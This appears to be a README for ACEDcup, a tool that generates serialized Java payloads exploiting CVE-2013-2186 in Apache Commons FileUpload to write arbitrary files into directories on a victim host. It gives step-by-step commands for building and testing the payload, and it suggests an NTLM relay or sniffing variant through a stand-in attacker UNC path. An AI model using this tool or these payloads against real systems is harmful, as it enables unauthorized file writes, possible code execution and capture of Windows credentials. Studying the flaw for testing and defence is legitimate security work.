# ACEDcup

ACEDcup tool is a payload generator for Java Binary Deserialization attack (ACED)

For Apache Commons FileUpload ver <= 1.3 (CVE-2013-2186) and Oracle JDK ver < 7u40

The attack works even for newer versions of the lib or Java. We can upload any content in any directory, but 
we cannot control a file name (smth like upload_f71d3547_72ed_4ae1_90fe_0d319115cd42_00000000.tmp) in this situation. Hovewer, it may be useful in some cases. 

Also we can perform a NTLM-relay/sniffing attack (using \\\\evilhost\\any\\path) if your target is on Windows OS.

## Usage
```
  1)At first, we create a serialized payload:
  java -jar aced_cup.jar /path/payload /path/target /path/out 1
  
  /path/payload - a path to a file with your payload
  /path/target - a path to a file that will be created in your victim (this will be stored in the serialized payload)
  /path/out - a path to a file with serialized payload
  0 - turn off null-byte ending if you attack a patched system (with null-byte- by default)

  2)Then we set the serialized payload to the serialized reader (if we want to test the vuln on your host) :
  java -jar ser_reader serialized_payload.txt
  
  ser_reader tries to deserialize the payload and because of a vulnerability in it's library, it creates a new file in the directory specified.

```
## Example

 ```java -jar aced_cup.jar D:\\cup_exploit\\payload.txt /home/user/test/any_name.txt D:\\cup_exploit\\serialized_payload.txt```
 
 ```java -jar ser_reader D:\\cup_exploit\\serialized_payload.txt````
